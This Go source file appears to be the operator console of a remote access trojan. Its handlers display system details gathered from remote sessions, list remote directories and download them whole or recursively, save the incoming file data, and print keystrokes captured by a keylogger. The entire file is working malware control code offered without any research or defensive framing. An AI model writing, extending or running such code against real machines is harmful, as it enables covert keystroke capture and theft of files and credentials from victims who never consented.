package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func handleSysInfoReply(payload []byte) {
	var info map[string]interface{}
	if err := json.Unmarshal(payload, &info); err != nil {
		fmt.Printf("%s[!] Failed to parse sysinfo: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	fmt.Printf("\r\033[K\n%s╔══════════════════════════════════════════════════════════════╗%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s║                    System Information                         ║%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s╠══════════════════════════════════════════════════════════════╣%s\n", ColorCyan, ColorReset)

	if hostname, ok := info["hostname"].(string); ok {
		fmt.Printf("  %sHostname:%s  %s\n", ColorYellow, ColorReset, hostname)
	}
	if platform, ok := info["platform"].(string); ok {
		fmt.Printf("  %sPlatform:%s  %s\n", ColorYellow, ColorReset, platform)
	}
	if machine, ok := info["machine"].(string); ok {
		fmt.Printf("  %sMachine:%s   %s\n", ColorYellow, ColorReset, machine)
	}
	if username, ok := info["username"].(string); ok {
		fmt.Printf("  %sUser:%s      %s\n", ColorYellow, ColorReset, username)
	}
	if cwd, ok := info["cwd"].(string); ok {
		fmt.Printf("  %sCWD:%s       %s\n", ColorYellow, ColorReset, cwd)
	}
	if pid, ok := info["pid"].(float64); ok {
		fmt.Printf("  %sPID:%s       %d\n", ColorYellow, ColorReset, int(pid))
	}

	fmt.Printf("%s╚══════════════════════════════════════════════════════════════╝%s\n\n", ColorCyan, ColorReset)
	refreshPrompt()
}

func handleFileData(payload []byte) {
	if pendingFile == "" {
		return
	}

	os.MkdirAll(filepath.Dir(pendingFile), 0755)

	f, err := os.OpenFile(pendingFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("%s[!] Error writing file: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer f.Close()

	f.Write(payload)

	if stats, ok := downloadStats[pendingFile]; ok {
		stats.TransferredBytes += int64(len(payload))
		fmt.Printf("\r\033[K%s[~] Downloading %s — %s received...%s",
			ColorYellow, filepath.Base(pendingFile), formatBytes(stats.TransferredBytes), ColorReset)
	}
}

func handleFileEOF() {
	if pendingFile == "" {
		return
	}

	localPath := pendingFile

	if stats, ok := downloadStats[pendingFile]; ok {
		duration := time.Since(stats.StartTime)
		speed := float64(stats.TransferredBytes) / duration.Seconds() / 1024
		fmt.Printf("\n%s[+] Downloaded: %s (%.2f KB/s)%s\n", ColorGreen, localPath, speed, ColorReset)
		delete(downloadStats, pendingFile)
	} else {
		fmt.Printf("\n%s[+] Downloaded: %s%s\n", ColorGreen, localPath, ColorReset)
	}

	pendingFile = ""
	refreshPrompt()
}

func remoteJoin(dir, name string) string {
	dir = strings.TrimRight(dir, "/\\")
	if dir == "" || dir == "." {
		return name
	}
	return dir + "/" + name
}

func handleFileListReply(payload []byte, sess *Session) {
	var items []map[string]interface{}
	if err := json.Unmarshal(payload, &items); err != nil {
		fmt.Printf("\r\033[K%s[!] Failed to parse file list: %v%s\n", ColorRed, err, ColorReset)
		refreshPrompt()
		return
	}

	mode := pendingDownloadMode
	pendingDownloadMode = ""

	switch mode {
	case "downloadall":
		curDir := pendingRemoteDir
		var files []string
		for _, item := range items {
			name, _ := item["name"].(string)
			isDir, _ := item["is_dir"].(bool)
			if !isDir {
				files = append(files, remoteJoin(curDir, name))
			}
		}
		startBulkDownloads(files, pendingLocalBase)

	case "downloadrecursive":
		curDir := pendingRemoteDir
		for _, item := range items {
			name, _ := item["name"].(string)
			isDir, _ := item["is_dir"].(bool)
			full := remoteJoin(curDir, name)
			if isDir {
				pendingDirStack = append(pendingDirStack, full)
			} else {
				pendingRemoteFiles = append(pendingRemoteFiles, full)
			}
		}
		if len(pendingDirStack) > 0 {
			next := pendingDirStack[0]
			pendingDirStack = pendingDirStack[1:]
			pendingRemoteDir = next
			pendingDownloadMode = "downloadrecursive"
			sendCommand(MsgFileList, []byte(next))
			return
		}
		files := pendingRemoteFiles
		pendingRemoteFiles = nil
		startBulkDownloads(files, pendingLocalBase)

	default:
		displayFileList(items)
	}
}

func displayFileList(items []map[string]interface{}) {
	type entry struct {
		name  string
		size  int64
		isDir bool
		mtime float64
	}
	var dirs, files []entry
	for _, item := range items {
		n, _ := item["name"].(string)
		sz, _ := item["size"].(float64)
		d, _ := item["is_dir"].(bool)
		mt, _ := item["mtime"].(float64)
		e := entry{n, int64(sz), d, mt}
		if d {
			dirs = append(dirs, e)
		} else {
			files = append(files, e)
		}
	}

	fmt.Printf("\r\033[K\n%s  Type  %-40s  %8s  %s%s\n", ColorCyan, "Name", "Size", "Modified", ColorReset)
	fmt.Printf("%s  %s%s\n", ColorCyan, strings.Repeat("─", 72), ColorReset)

	for _, e := range dirs {
		name := e.name + "/"
		t := time.Unix(int64(e.mtime), 0).Format("2006-01-02 15:04")
		fmt.Printf("  %sDIR%s   %-40s  %8s  %s\n", ColorBlue, ColorReset, name, "-", t)
	}
	for _, e := range files {
		t := time.Unix(int64(e.mtime), 0).Format("2006-01-02 15:04")
		fmt.Printf("  %sFILE%s  %-40s  %8s  %s\n", ColorGreen, ColorReset, e.name, formatBytes(e.size), t)
	}

	fmt.Printf("%s  %s%s\n", ColorCyan, strings.Repeat("─", 72), ColorReset)
	fmt.Printf("  %d dir(s), %d file(s)\n\n", len(dirs), len(files))
	refreshPrompt()
}

func handleKeylogDataReply(payload []byte) {
	text := strings.TrimSpace(string(payload))
	if text == "" || text == "(no keystrokes captured)" {
		fmt.Printf("\r\033[K%s[*] No keystrokes captured%s\n", ColorBlue, ColorReset)
	} else {
		fmt.Printf("\r\033[K%s[+] Captured keystrokes:%s\n%s\n", ColorGreen, ColorReset, text)
	}
	refreshPrompt()
}

func handleSearchReply(payload []byte) {
	results := strings.TrimSpace(string(payload))
	if results == "" {
		fmt.Printf("\r\033[K%s[*] No matches found%s\n", ColorBlue, ColorReset)
	} else {
		lines := strings.Split(results, "\n")
		fmt.Printf("\r\033[K%s[+] Found %d match(es):%s\n", ColorGreen, len(lines), ColorReset)
		for _, l := range lines {
			fmt.Printf("  %s\n", l)
		}
	}
	refreshPrompt()
}
